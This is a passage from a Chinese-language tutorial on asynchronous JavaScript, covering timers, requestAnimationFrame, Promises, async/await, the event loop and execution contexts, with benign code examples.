title="缺陷"></a>缺陷</h3><ul><li>嵌套回调可能很麻烦且难以阅读（即“<strong>回调地狱</strong>”）</li><li>每层嵌套都需要故障回调，而使用promises，您只需使用一个<code>.catch（）</code>代码块来处理整个链的错误。</li><li>异步回调<strong>不是很优雅</strong>。</li><li>Promise回调总是按照它们<strong>放在事件队列中的严格顺序调用</strong>;<strong>异步回调不是</strong>。</li><li>当传入到一个<strong>第三方库</strong>时，异步回调对函数如何执行<strong>失去完全控制</strong>。</li></ul><h2 id="setTimeout-1"><a href="#setTimeout-1" class="headerlink" title="setTimeout()"></a>setTimeout()</h2><p><code>setTimeout()</code> 是一种允许您在经过任意时间后运行函数的方法</p><p>这里浏览器将在执行匿名函数之前等待两秒钟，然后将显示警报消息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello, Mr. Universe!&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br></pre></td></tr></table></figure><h3 id="缺陷-1"><a href="#缺陷-1" class="headerlink" title="缺陷"></a>缺陷</h3><p>您可以使用递归的<code>setTimeout（）</code>调用以类似于<code>setInterval（）</code>的方式重复运行函数，使用如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  i++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(run, <span class="number">100</span>);</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>递归<code>setTimeout（）</code>和<code>setInterval（）</code>之间存在差异：</p><ul><li>递归<code>setTimeout（）</code>保证两次执行间经过指定的时间量（在本例中为100ms）;代码将运行，然后等待100毫秒再次运行。无论代码运行多长时间，间隔都是相同的。</li><li>使用<code>setInterval（）</code>，我们选择的时间间隔包含了运行代码所花费的时间。（还是100ms为例）假设代码需要40毫秒才能运行 –– 间隔最终只会有60毫秒。</li></ul><p>当你的代码有可能比你分配的时间间隔更长时间运行时，最好使用递归的<code>setTimeout（）</code> ––这将使执行之间的时间间隔保持不变，无论代码执行多长时间，你不会得到错误。</p><h2 id="setInterval-1"><a href="#setInterval-1" class="headerlink" title="setInterval()"></a>setInterval()</h2><p><code>setInterval()</code>函数允许重复执行一个函数，并设置时间间隔。不如<code>requestAnimationFrame()</code>有效率，但允许您选择运行速率/帧速率。</p><p>以下函数创建一个新的<code>Date()</code>对象，使用<code>toLocaleTimeString()</code>从中提取时间字符串，然后在UI中显示它。然后我们使用<code>setInterval（）</code>每秒运行一次，创建每秒更新一次的数字时钟的效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">   <span class="keyword">let</span> time = date.toLocaleTimeString();</span><br><span class="line">   <span class="built_in">document</span>.getElementById(<span class="string">&#x27;demo&#x27;</span>).textContent = time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createClock = <span class="built_in">setInterval</span>(displayTime, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h3 id="缺陷-2"><a href="#缺陷-2" class="headerlink" title="缺陷"></a>缺陷</h3><ul><li>帧速率未针对运行动画的系统进行优化，并且可能效率低下。除非您需要选择特定（较慢）的帧速率，否则通常最好使用<code>requestAnimationFrame()</code>.</li></ul><h2 id="requestAnimationFrame-1"><a href="#requestAnimationFrame-1" class="headerlink" title="requestAnimationFrame()"></a>requestAnimationFrame()</h2><p><code>requestAnimationFrame()</code>是一种<strong>允许您以给定当前浏览器/系统的最佳帧速率重复且高效地运行函数</strong>的方法。除非您需要特定的速率帧，否则您应该尽可能使用它而不要去使用<code>setInterval()/recursive setTimeout()</code>。</p><p>一个简单的动画旋转器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> spinner = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> rotateCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> startTime = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> rAF;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">timestamp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!startTime) &#123;</span><br><span class="line">    startTime = timestamp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rotateCount = (timestamp - startTime) / <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  spinner.style.transform = <span class="string">&#x27;rotate(&#x27;</span> + rotateCount + <span class="string">&#x27;deg)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rotateCount &gt; <span class="number">359</span>) &#123;</span><br><span class="line">    rotateCount = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rAF = requestAnimationFrame(draw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">draw();</span><br></pre></td></tr></table></figure><h3 id="缺陷-3"><a href="#缺陷-3" class="headerlink" title="缺陷"></a>缺陷</h3><ul><li>您无法使用<code>requestAnimationFrame（）</code>选择特定的帧速率。如果需要以较慢的帧速率运行动画，则需要使用<code>setInterval（）</code>或递归的<code>setTimeout（）</code>。</li></ul><h2 id="Promises-1"><a href="#Promises-1" class="headerlink" title="Promises"></a>Promises</h2><p>Promises是一种<strong>JavaScript功能</strong>，允许您<strong>运行异步操作并等到它完全完成后再根据其结果运行另一个操作</strong>。 </p><p>Promise是<strong>现代异步JavaScript的支柱</strong>。</p><p>以下代码从服务器获取图像并将其显示在<code>&lt;img&gt;</code>元素中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>)</span><br><span class="line">.then(<span class="function"><span class="params">response</span> =&gt;</span> response.blob())</span><br><span class="line">.then(<span class="function"><span class="params">myBlob</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;There has been a problem with your fetch operation: &#x27;</span> + e.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="缺陷-4"><a href="#缺陷-4" class="headerlink" title="缺陷"></a>缺陷</h3><p><strong>Promise链可能很复杂，难以解析。</strong>如果你嵌套了许多promises，你最终可能会遇到类似的麻烦来回调地狱。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">remotedb.allDocs(&#123;</span><br><span class="line">  <span class="attr">include_docs</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">attachments</span>: <span class="literal">true</span></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> docs = result.rows;</span><br><span class="line">  docs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    localdb.put(element.doc).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">      alert(<span class="string">&quot;Pulled doc with id &quot;</span> + element.doc._id + <span class="string">&quot; and added to local db.&quot;</span>);</span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (err.name == <span class="string">&#x27;conflict&#x27;</span>) &#123;</span><br><span class="line">        localdb.get(element.doc._id).then(<span class="function"><span class="keyword">function</span> (<span class="params">resp</span>) </span>&#123;</span><br><span class="line">          localdb.remove(resp._id, resp._rev).then(<span class="function"><span class="keyword">function</span> (<span class="params">resp</span>) </span>&#123;</span><br><span class="line"><span class="comment">// et cetera...</span></span><br></pre></td></tr></table></figure><p>最好使用promises的链功能，这样使用更平顺，更易于解析的结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">remotedb.allDocs(...).then(<span class="function"><span class="keyword">function</span> (<span class="params">resultOfAllDocs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.put(...);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">resultOfPut</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.get(...);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">resultOfGet</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.put(...);</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>乃至：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">remotedb.allDocs(...)</span><br><span class="line">.then(<span class="function"><span class="params">resultOfAllDocs</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.put(...);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">resultOfPut</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.get(...);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">resultOfGet</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> localdb.put(...);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err));</span><br></pre></td></tr></table></figure><h2 id="Promise-all-1"><a href="#Promise-all-1" class="headerlink" title="Promise.all()"></a>Promise.all()</h2><p>一种JavaScript功能，允许您<strong>等待多个promises完成，然后根据所有其他promises的结果运行进一步的操作。</strong></p><p>以下示例从服务器获取多个资源，并使用<code>Promise.all（）</code>等待所有资源可用，然后显示所有这些资源：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetchAndDecode</span>(<span class="params">url, type</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Returning the top level promise, so the result of the entire chain is returned out of the function</span></span><br><span class="line">  <span class="keyword">return</span> fetch(url).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Depending on what type of file is being fetched, use the relevant function to decode its contents</span></span><br><span class="line">    <span class="keyword">if</span>(type === <span class="string">&#x27;blob&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> response.blob();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(type === <span class="string">&#x27;text&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> response.text();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`There has been a problem with your fetch operation for resource &quot;<span class="subst">$&#123;url&#125;</span>&quot;: `</span> + e.message);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the fetchAndDecode() method to fetch the images and the text, and store their promises in variables</span></span><br><span class="line"><span class="keyword">let</span> coffee = fetchAndDecode(<span class="string">&#x27;coffee.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> tea = fetchAndDecode(<span class="string">&#x27;tea.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> description = fetchAndDecode(<span class="string">&#x27;description.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use Promise.all() to run code only when all three function calls have resolved</span></span><br><span class="line"><span class="built_in">Promise</span>.all([coffee, tea, description]).then(<span class="function"><span class="params">values</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(values);</span><br><span class="line">  <span class="comment">// Store each value returned from the promises in separate variables; create object URLs from the blobs</span></span><br><span class="line">  <span class="keyword">let</span> objectURL1 = URL.createObjectURL(values[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">let</span> objectURL2 = URL.createObjectURL(values[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> descText = values[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Display the images in &lt;img&gt; elements</span></span><br><span class="line">  <span class="keyword">let</span> image1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> image2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image1.src = objectURL1;</span><br><span class="line">  image2.src = objectURL2;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image1);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Display the text in a paragraph</span></span><br><span class="line">  <span class="keyword">let</span> para = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">  para.textContent = descText;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(para);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="缺陷-5"><a href="#缺陷-5" class="headerlink" title="缺陷"></a>缺陷</h3><ul><li>如果<code>Promise.all（）</code>拒绝，那么你在其数组参数中输入的一个或多个promise(s)就会被拒绝，或者可能根本不返回promises。你需要检查每一个，看看他们返回了什么。</li></ul><h2 id="Async-await"><a href="#Async-await" class="headerlink" title="Async/await"></a>Async/await</h2><p><strong>构造在promises之上的语法糖，允许您使用更像编写同步回调代码的语法来运行异步操作。</strong></p><p>以下示例是我们之前看到的简单承诺示例的重构，该示例获取并显示图像，使用async / await编写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> myBlob = <span class="keyword">await</span> response.blob();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFetch();</span><br></pre></td></tr></table></figure><h3 id="缺陷-6"><a href="#缺陷-6" class="headerlink" title="缺陷"></a>缺陷</h3><ul><li>您不能在非<code>async</code>函数内或代码的顶级上下文环境中使用<code>await</code>运算符。这有时会导致需要创建额外的函数封包，这在某些情况下会略微令人沮丧。但大部分时间都值得。</li><li>浏览器对async / await的支持不如promises那样好。如果你想使用async / await但是担心旧的浏览器支持，你可以考虑使用BabelJS库 - 这允许你使用最新的JavaScript编写应用程序，让Babel找出用户浏览器需要的更改。</li></ul><h1 id="事件循环机制"><a href="#事件循环机制" class="headerlink" title="事件循环机制"></a>事件循环机制</h1><p>我们都知道 Js 是单线程的，但是一些高耗时操作就带来了进程阻塞问题。</p><p>为了解决这个问题，Js 有两种任务的执行模式：<strong>同步模式（Synchronous）和异步模式（Asynchronous）</strong>。</p><h2 id="宏任务与微任务"><a href="#宏任务与微任务" class="headerlink" title="宏任务与微任务"></a>宏任务与微任务</h2><p>在异步模式下，创建<strong>异步任务主要分为宏任务与微任务两种</strong>。</p><p>ES6 规范中，宏任务（Macrotask） 称为 Task， 微任务（Microtask） 称为 Jobs。</p><p>宏任务是由宿主（浏览器、Node）发起的，而微任务由 JS 自身发起。</p><p><strong>宏任务与微任务的几种创建方式</strong> </p><table><thead><tr><th>宏任务（Macrotask）</th><th>微任务（Microtask）</th></tr></thead><tbody><tr><td>setTimeout</td><td>requestAnimationFrame（有争议）</td></tr><tr><td>setInterval</td><td>MutationObserver（浏览器环境）</td></tr><tr><td>MessageChannel</td><td>Promise.[ then/catch/finally ]</td></tr><tr><td>I/O，事件队列</td><td>process.nextTick（Node环境）</td></tr><tr><td>setImmediate（Node环境）</td><td>queueMicrotask</td></tr><tr><td>script（整体代码块）</td><td></td></tr></tbody></table><h2 id="EventLoop"><a href="#EventLoop" class="headerlink" title="EventLoop"></a>EventLoop</h2><p><a href="https://imgtu.com/i/bt7ZTO"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/bt7ZTO.png" alt="bt7ZTO.png"></a></p><ol><li>判断宏任务队列是否为空<ul><li>不空 –&gt; 执行最早进入队列的任务 –&gt; 执行下一步</li><li>空 –&gt; 执行下一步</li></ul></li><li>判断微任务队列是否为空<ul><li>不空 –&gt; 执行最早进入队列的任务 –&gt; <strong>继续检查微任务队列空不空</strong></li><li>空 –&gt; 执行下一步</li></ul></li></ol><p><strong>如何理解 script（整体代码块）是个宏任务呢</strong> </p><p>实际上如果同时存在两个 script 代码块，会首先在执行<strong>第一个 script 代码块中的同步代码</strong>，如果这个过程中创建了微任务并进入了微任务队列，第一个 script 同步代码执行完之后，会首先去<strong>清空微任务队列</strong>，再去开启<strong>第二个 script 代码块</strong>的执行。所以这里应该就可以理解 script（整体代码块）为什么会是宏任务。</p><p>因为首次执行宏队列中会有 script（整体代码块）任务，所以实际上就是 Js 解析完成后，在异步任务中，会<strong>先执行完所有的微任务</strong>，这里也是很多面试题喜欢考察的。需要注意的是，新创建的微任务会立即进入微任务队列排队执行，不需要等待下一次轮回。</p><p>所谓任务，浅显来说就是<strong>代码块开始执行的入口</strong>(确切地说，是函数栈的入口，但是栈的概念较为复杂，不表)。而在 <code>JS</code> 里，除了“<code>script</code>整体代码块”之外，<strong>所有代码块的入口都是“*回调函数*”</strong>，回调函数被注册到事件后不会马上被执行，而是保存在一个神秘的的地方，保存起来待执行的才能算“任务”，然后才有宏/微任务之分。</p><p>“<code>script</code>整体代码块”的特殊之处，在于<strong>它的入口不是回调函数</strong>，但是我们可以想象它被装在一个隐形的函数里，作为回调函数被注册到某个事件里（大概是它解析完成之后会触发的一个事件），这时候这个隐形的函数就成为了一个任务。</p><p>总的来说就是，宏任务作为主导，它有支配微任务的能力，在一个宏任务任务消灭之前，它会让它创建的微任务任务都执行完，然后才进入下一个宏任务任务。</p><p>然后，入栈出栈，这个另一个概念，是每个任务执行它的代码的时候发生的，比如变量定义，函数调用，通过栈的入出，计算出结果。</p><blockquote><p>补充</p></blockquote><p><strong>计算机中的同步</strong>是连续性的动作，上一步未完成前，下一步会发生堵塞，直至上一步完成后，下一步才可以继续执行。</p><p><code>JavaScript</code>的确是一门单线程语言，但是浏览器<code>UI</code>是多线程的，异步任务借助浏览器的线程和<code>JavaScript</code>的执行机制实现。 例如，<code>setTimeout</code>就借助浏览器定时器触发线程的计时功能来实现。</p><h2 id="JavaScript-执行上下文"><a href="#JavaScript-执行上下文" class="headerlink" title="JavaScript 执行上下文"></a>JavaScript 执行上下文</h2><p>当一段 JavaScript 代码在运行的时候，它实际上是运行在<strong>执行上下文</strong>中。下面3种类型的代码会创建一个新的执行上下文：</p><ul><li><strong>全局上下文</strong>是为运行<strong>代码主体</strong>而创建的执行上下文，也就是说它是为那些<strong>存在于JavaScript 函数之外的任何代码而创建的</strong>。</li><li>每个<strong>函数</strong>会在执行的时候创建自己的执行上下文。这个上下文就是通常说的 “<strong>本地/局部上下文</strong>（local context）”。</li><li>使用 <code>eval()</code>函数也会创建一个新的执行上下文。</li></ul><p>每一个上下文在本质上都是一种<strong>作用域</strong>层级。每个代码段开始执行的时候都会创建一个新的上下文来运行它，并且在代码退出的时候销毁掉。看看下面这段 JavaScript 程序：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> outputElem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;output&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> userLanguages = &#123;</span><br><span class="line">  <span class="string">&quot;Mike&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Teresa&quot;</span>: <span class="string">&quot;es&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greetUser</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">localGreeting</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> greeting;</span><br><span class="line">    <span class="keyword">let</span> language = userLanguages[user];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(language) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;es&quot;</span>:</span><br><span class="line">        greeting = <span class="string">`¡Hola, <span class="subst">$&#123;user&#125;</span>!`</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;en&quot;</span>:</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        greeting = <span class="string">`Hello, <span class="subst">$&#123;user&#125;</span>!`</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> greeting;</span><br><span class="line">  &#125;</span><br><span class="line">  outputElem.innerHTML += localGreeting(user) + <span class="string">&quot;&lt;br&gt;\r&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greetUser(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line">greetUser(<span class="string">&quot;Teresa&quot;</span>);</span><br><span class="line">greetUser(<span class="string">&quot;Veronica&quot;</span>);</span><br></pre></td></tr></table></figure><p>这段程序代码包含了三个执行上下文，其中有些会在程序运行的过程中多次创建和销毁。每个上下文创建的时候会被推入<strong>执行上下文栈</strong>。当退出的时候，它会从上下文栈中移除。</p><ul><li>程序开始运行时，<strong>全局上下文</strong>就会被创建好。<ul><li>当执行到 <code>greetUser(&quot;Mike&quot;)</code>的时候会为 <code>greetUser()</code>函数创建一个它的上下文。这个执行上下文会被推入执行上下文栈中。<ul><li>当 <code>greetUser()</code> 调用 <code>localGreeting()</code>的时候会为该方法创建一个新的上下文。并且在 <code>localGreeting()</code> 退出的时候它的上下文也会从执行栈中弹出并销毁。 程序会从栈中获取下一个上下文并恢复执行, 也就是从<code>greetUser()</code> 剩下的部分开始执行。</li><li><code>greetUser()</code> 执行完毕并退出，其上下文也从栈中弹出并销毁。</li></ul></li><li>当 <code>greetUser(&quot;Teresa&quot;)</code>开始执行时，程序又会为它创建一个上下文并推入栈顶。<ul><li>当 <code>greetUser()</code> 调用 <code>localGreeting()</code>的时候另一个上下文被创建并用于运行该函数。 当 <code>localGreeting()</code> 退出的时候它的上下文也从栈中弹出并销毁。 <code>greetUser()</code> 得到恢复并继续执行剩下的部分。</li><li><code>greetUser()</code> 执行完毕并退出，其上下文也从栈中弹出并销毁。</li></ul></li><li>然后执行到 <code>greetUser(&quot;Veronica&quot;)</code>又再为它创建一个上下文并推入栈顶。<ul><li>当 <code>greetUser()</code> 调用 <code>localGreeting()</code>的时候，另一个上下文被创建用于执行该函数。当 <code>localGreeting()</code>执行完毕，它的上下文也从栈中弹出并销毁。</li><li><code>greetUser()</code> 执行完毕退出，其上下文也从栈中弹出并销毁。</li></ul></li></ul></li><li>主程序退出，全局执行上下文从执行栈中弹出。此时栈中所有的上下文都已经弹出，程序执行完毕。</li></ul><p>以这种方式来使用执行上下文，使得<strong>每个程序和函数都能够拥有自己的变量和其他对象</strong>。</p><p>每个上下文还能够额外的跟踪程序中下一行需要执行的代码以及一些对上下文非常重要的信息。</p><p>以这种方式来使用上下文和上下文栈，使得我们可以对程序运行的一些基础部分进行管理，包括局部和全局变量、函数的调用与返回等。</p><p>关于递归函数——即多次调用自身的函数，需要特别注意：<strong>每次递归调用自身都会创建一个新的上下文</strong>。</p><p>这使得 JavaScript 运行时能够<strong>追踪递归的层级以及从递归中得到的返回值，但这也意味着每次递归都会消耗内存来创建新的上下文</strong>。</p><h2 id="JavaScript运行时"><a href="#JavaScript运行时" class="headerlink" title="JavaScript运行时"></a>JavaScript运行时</h2><p>在执行 JavaScript 代码的时候，JavaScript 运行时实际上维护了一组用于执行 JavaScript 代码的<strong>代理</strong>。</p><p>每个代理由<strong>一组执行上下文的集合、执行上下文栈、主线程、一组可能创建用于执行 worker 的额外的线程集合、一个任务队列以及一个微任务队列</strong>构成。</p><p>除了主线程（某些浏览器在多个代理之间共享的主线程）之外，其它组成部分对该代理都是唯一的。</p><h3 id="事件循环（Event-loops）"><a href="#事件循环（Event-loops）" class="headerlink" 